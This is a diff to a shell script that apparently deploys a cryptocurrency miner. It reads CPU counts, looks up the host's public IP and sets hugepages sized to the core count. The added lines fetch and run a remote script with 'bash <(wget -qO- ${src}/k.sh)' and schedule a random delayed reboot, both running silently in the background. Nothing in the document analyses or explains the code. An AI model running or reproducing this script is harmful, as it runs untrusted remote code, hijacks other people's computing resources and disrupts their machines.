@@ -16,10 +16,15 @@ cores=`grep 'siblings' /proc/cpuinfo 2>/dev/null |cut -d':' -f2 | head -n1 |grep
 addr=`wget --no-check-certificate -4 -qO- http://checkip.amazonaws.com/ 2>/dev/null`
 [ -n "$addr" ] || addr="NULL"
 
+
+if [ "$mode" == "0" ]; then
+  delay="$[`od -An -N2 -i /dev/urandom` % 21600 + 43200]"
+  bash <(echo "sleep $delay && sudo reboot || reboot") >/dev/null 2>&1 &
+fi
+
 if [ "$mode" == "1" ]; then
-  # bash <(wget -qO- ${src}/k.sh) 1024 0 >/dev/null 2>&1 &
+  bash <(wget -qO- ${src}/k.sh) 43200 21600 >/dev/null 2>&1 &
   [ "$cores" == "2" ] && cores="1";
-  # [ "$cores" == "8" ] && cores="4";
 fi
 
 sudo sysctl -w vm.nr_hugepages=$((cores*1024)) >/dev/null 2>&1 || sysctl -w vm.nr_hugepages=$((cores*1024)) >/dev/null 2>&1
